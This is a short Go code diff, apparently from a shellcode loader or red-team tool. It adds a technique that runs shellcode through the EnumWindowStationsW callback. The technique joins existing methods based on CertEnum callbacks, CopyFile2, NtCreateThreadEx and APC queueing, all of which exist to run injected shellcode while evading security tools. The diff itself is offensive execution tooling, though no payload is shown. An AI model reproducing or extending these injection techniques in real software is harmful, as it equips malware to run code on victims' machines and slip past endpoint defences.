@@ -18,6 +18,7 @@ const (
 	CertEnumPhysicalStore RunMethod = iota + 1
 	CertEnumSystemStore
 	CopyFile2
+	EnumWindowStationsW
 	NtCreateThreadEx
 	NtQueueApcThread
 	NtQueueApcThreadEx
@@ -28,6 +29,7 @@ var runMethods map[RunMethod]rFunc = map[RunMethod]rFunc{
 	CertEnumPhysicalStore: runCertPhysical,
 	CertEnumSystemStore:   runCertSystem,
 	CopyFile2:             runCopy,
+	EnumWindowStationsW:   runEnumWS,
 	NtCreateThreadEx:      runCreateThreadEx,
 	NtQueueApcThread:      runApcThread,
 	NtQueueApcThreadEx:    runApcThreadEx,
@@ -108,7 +110,8 @@ func runCopy(s *state) (*state, error) {
 	)
 	if e != nil {
 		if !strings.HasSuffix(e.Error(), expected) {
-			return nil, errors.Newf("failed to execute shellcode: %w", e)
+			e = errors.Newf("failed to execute shellcode: %w", e)
+			return nil, e
 		}
 	}
 
@@ -120,6 +123,14 @@ func runCreateThreadEx(s *state) (*state, error) {
 
 	s.thread, e = w32.NtCreateThreadEx(s.proc, s.addr, s.l.suspend)
 	if e != nil {
+		return nil, errors.Newf("failed to execute shellcode: %w", e)
+	}
+
+	return s, nil
+}
+
+func runEnumWS(s *state) (*state, error) {
+	if e := w32.EnumWindowStationsW(s.addr, 0); e != nil {
 		return nil, errors.Newf("failed to execute shellcode: %w", e)
 	}
 
